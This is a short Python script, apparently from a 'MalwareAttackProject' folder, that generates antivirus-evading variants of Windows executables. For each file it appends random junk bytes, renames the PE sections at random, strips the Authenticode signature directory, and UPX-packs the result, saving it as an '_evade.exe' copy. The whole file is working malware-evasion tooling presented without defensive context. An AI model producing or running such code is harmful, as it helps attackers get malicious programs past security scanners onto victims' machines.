import os
import shutil
import random
import string
import pefile
import subprocess

ORIGINAL = r"C:\MalwareAttackProject\original"
OUTPUT   = r"C:\MalwareAttackProject\modified"

def random_string(n=8):
    return ''.join(random.choice(string.ascii_letters) for _ in range(n))

def add_junk_data(path):
    with open(path, "ab") as f:
        f.write(os.urandom(random.randint(2000, 7000)))

def rename_sections(path):
    pe = pefile.PE(path)
    for section in pe.sections:
        newname = random_string(7).encode().ljust(8, b'\x00')
        section.Name = newname
    pe.write(path)

def strip_signature(path):
    pe = pefile.PE(path)
    if pe.OPTIONAL_HEADER.DATA_DIRECTORY[4].VirtualAddress != 0:
        pe.OPTIONAL_HEADER.DATA_DIRECTORY[4].VirtualAddress = 0
        pe.OPTIONAL_HEADER.DATA_DIRECTORY[4].Size = 0
        pe.write(path)

def upx_pack(path):
    try:
        subprocess.run(["upx.exe", "--best", "--lzma", path], stdout=subprocess.PIPE)
    except:
        pass

def make_variant(infile, outfile):
    shutil.copy(infile, outfile)
    
    # Apply all evasions:
    add_junk_data(outfile)
    try: rename_sections(outfile)
    except: pass
    try: strip_signature(outfile)
    except: pass
    try: upx_pack(outfile)
    except: pass

def main():
    os.makedirs(OUTPUT, exist_ok=True)

    for fn in os.listdir(ORIGINAL):
        if fn.lower().endswith(".exe"):
            src = os.path.join(ORIGINAL, fn)
            dst = os.path.join(OUTPUT, f"{os.path.splitext(fn)[0]}_evade.exe")
            print("[+] Generating:", dst)
            make_variant(src, dst)

if __name__ == "__main__":
    main()